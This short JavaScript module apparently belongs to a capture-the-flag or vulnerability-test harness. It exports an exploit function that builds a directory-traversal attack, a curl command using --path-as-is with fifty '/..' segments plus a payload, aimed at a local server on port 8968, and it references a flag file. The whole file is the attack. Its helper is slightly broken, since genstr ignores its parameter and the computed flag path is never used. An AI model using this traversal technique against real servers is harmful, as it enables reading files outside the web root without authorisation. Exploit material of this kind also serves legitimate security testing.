function exploitFunction(payload) {
  const path = require("path");
  const pathToFlag = path.resolve(__dirname, "../flag.html");

  function genstr(n) {
    return "/..".repeat(50) + payload; // Use the payload directly
  }

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8968${genstr()}"`;

  return { attack_string };
}

module.exports = { exploitFunction };